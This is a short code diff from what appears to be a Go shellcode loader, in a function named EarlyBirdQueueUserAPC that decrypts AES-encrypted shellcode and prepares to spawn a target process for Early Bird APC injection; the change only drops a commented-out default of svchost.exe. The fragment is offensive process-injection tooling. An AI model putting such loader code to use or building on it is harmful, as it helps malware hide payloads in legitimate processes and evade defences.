@@ -17,8 +17,7 @@ func EarlyBirdQueueUserAPC (spawn string, shellcodeEncrypted string, key string)
 
     plaintext := crypto.DecryptAES(shellcodeEncrypted, key)
 	shellcode, _ := hex.DecodeString(string(plaintext))
-
-	//var spawn string = "C:\\Windows\\system32\\svchost.exe"
+	
 	spawn16, _ := windows.UTF16PtrFromString(spawn)
 
 	pi := windows.ProcessInformation{}
